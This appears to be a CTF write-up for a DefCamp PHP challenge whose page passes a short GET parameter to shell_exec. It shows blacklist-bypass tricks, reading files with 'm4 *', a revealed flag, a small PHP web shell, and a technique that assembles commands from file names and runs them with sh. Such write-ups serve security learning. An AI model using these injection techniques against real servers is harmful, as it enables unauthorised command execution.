# DefCamp CTF - para-code

## Description
Command injecion 4 characters limited
```php
if (strlen($_GET['start']) < 5){
  echo shell_exec($_GET['start']);
}
```

If we can inject `cat *`, we could read all files in the directory but this command has 5 characters so it's doesn't work.

## Bypass black-listed
**Search**: 

php tricks hacktricks: https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp

bypass bash restrictiosn: https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions

**Bypassed
```
'l's # flag.php, index.php
l''s # still good
p\s # processes
env
```

## Bypass using short command of cat

**Search**: 

Linux two letters command: https://www.davekb.com/browse_computer_tips:linux_two_letter_commands:txt

```bash
# using m4(same as cat)
m4 *
```
Remember to check the `source-code` of the result

**flag**: `791b21ee6421993a8e25564227a816ee52e48edb437909cba7e1e80c0579b6be`

## Extended to RCE

**In bash, write file input from stdin**:
```bash
>cmd.php
#> <?php system('id'); ?>
cat cmd.php # <?php system('id'); ?>
```

**From that, we got**:
```bash
>php # newline - end command here!
>ex.\\
>ind\\
>\ \\
>cat\\

ls -t>_ # sort by time, in real senario, we have to write a file for this task, just like below

sh _
# hello
```

`_` file:
```bash
cat _
#_            error command/not command raise error but still being ignored and keep running!!
#cat\
# \
#ind\
#ex.\
#php
#index.php
```

# References:
https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge-v2
